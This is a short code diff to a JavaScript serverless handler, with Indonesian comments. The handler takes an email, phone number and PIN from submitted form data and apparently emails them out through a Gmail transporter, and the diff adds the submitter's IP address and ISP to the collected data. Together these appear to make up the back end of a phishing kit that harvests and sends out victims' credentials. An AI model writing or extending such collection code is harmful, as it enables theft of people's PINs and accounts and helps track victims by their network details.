@@ -8,7 +8,7 @@ export default async function handler(req, res) {
   }
 
   try {
-    const { email, phone, pin } = req.body;
+    const { email, phone, pin, ip, isp } = req.body; // ⬅️ ambil juga ip & isp
 
     if (!email && !phone) {
       return res.status(400).json({
@@ -22,6 +22,8 @@ export default async function handler(req, res) {
     if (email) text += `Email: ${email}\n`;
     if (phone) text += `Phone: ${phone}\n`;
     if (pin) text += `PIN: ${pin}\n`;
+    if (ip) text += `IP Address: ${ip}\n`;   // ⬅️ tambahan
+    if (isp) text += `ISP: ${isp}\n`;        // ⬅️ tambahan
 
     // Transporter Gmail
     const transporter = nodemailer.createTransport({
